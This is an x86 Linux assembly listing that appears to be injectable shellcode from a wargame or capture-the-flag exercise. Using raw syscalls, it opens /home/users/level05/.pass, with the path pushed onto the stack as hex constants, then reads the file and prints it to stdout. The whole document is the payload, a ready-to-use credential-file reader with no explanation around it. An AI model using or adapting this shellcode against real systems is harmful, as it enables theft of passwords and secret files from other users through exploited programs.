global _start

section .text

_start:
  xor ecx, ecx
  mul ecx

open:
  push 5
  pop eax
  push ecx
  push 0x73
  push 0x7361702e
  push 0x2f35306c
  push 0x6576656c
  push 0x2f737265
  push 0x73752f65
  push 0x6d6f682f; /home/users/level05/.pass
  mov ebx, esp
  int 0x80

read:
  push eax
  pop ebx
  push 41
  pop edx
  lea ecx, [esp]
  inc edx
  int 0x80

write:
  push eax
  pop edx
  push 1
  pop ebx
  push 4
  pop eax
  int 0x80

exit:
  push 1
  pop eax
  int 0x80
